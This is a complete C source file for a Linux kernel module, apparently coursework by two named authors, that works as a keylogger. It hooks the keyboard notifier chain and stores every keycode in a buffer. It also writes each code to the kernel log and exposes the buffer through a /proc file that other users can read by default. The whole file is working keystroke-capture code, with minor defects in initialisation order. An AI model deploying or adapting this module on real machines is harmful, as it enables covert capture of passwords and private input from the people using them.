#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/semaphore.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>

#define MAX_BUFFER_SIZE 1024

static char key_buffer[MAX_BUFFER_SIZE];


static int buffer_index = 0;
static struct semaphore buffer_sem;
static struct notifier_block nb;

static int meu_manipulador_de_interupcao(struct notifier_block *nb, unsigned long action, void *data) {
    struct keyboard_notifier_param *param = data;

    if (action == KBD_KEYCODE) {
        down(&buffer_sem);

        if (buffer_index < MAX_BUFFER_SIZE - 4) {
            printk(KERN_INFO "valor de params.value: %d\n", param->value);
            buffer_index += snprintf(&key_buffer[buffer_index], MAX_BUFFER_SIZE - buffer_index, "%c ", param->value);            
        }

        up(&buffer_sem);
    }

    return NOTIFY_OK;
}

static int meu_leitor_de_arquivo(struct seq_file *m, void *v) {
    down(&buffer_sem);
    seq_puts(m, key_buffer);
    up(&buffer_sem);

    return 0;
}

static int meu_abridor_de_arquivo(struct inode *inode, struct file *file) {
    return single_open(file, meu_leitor_de_arquivo, NULL);
}

static const struct proc_ops meu_operador_de_arquivo = {
    .proc_open = meu_abridor_de_arquivo,
    .proc_read = seq_read,
    .proc_lseek = seq_lseek,
    .proc_release = single_release,
};

static int __init meu_modulo_init(void) {
    nb.notifier_call = meu_manipulador_de_interupcao;
    register_keyboard_notifier(&nb);
    sema_init(&buffer_sem, 1);
    proc_create("meu_arquivo", 0, NULL, &meu_operador_de_arquivo);
    printk(KERN_INFO "Módulo de kernel de leitura do teclado carregado.\n");


    return 0;
}

static void __exit meu_modulo_exit(void) {
    unregister_keyboard_notifier(&nb);
    remove_proc_entry("meu_arquivo", NULL);
    printk(KERN_INFO "Módulo de kernel de leitura do teclado descarregado.\n");
}

module_init(meu_modulo_init);
module_exit(meu_modulo_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Aruan Bretas e William Simonelli");
MODULE_DESCRIPTION("Módulo de kernel para captura de teclado");

